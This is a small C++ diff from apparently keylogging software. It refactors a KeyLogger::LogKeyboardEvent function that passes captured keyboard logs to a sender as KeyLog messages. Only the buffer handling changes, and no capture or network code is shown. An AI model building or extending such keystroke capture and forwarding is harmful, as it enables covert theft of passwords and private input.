@@ -115,9 +115,7 @@ void KeyLogger::LogKeyboardEvent(const std::string& log) const
 {
 	Trace(log.c_str());
 
-	const auto content = std::span(
-		const_cast<char*>(log.c_str()),
-		log.size());
+	const auto content = SharedSpan(log);
 
 	_sender->Send(MessageType::KeyLog, content);
 }
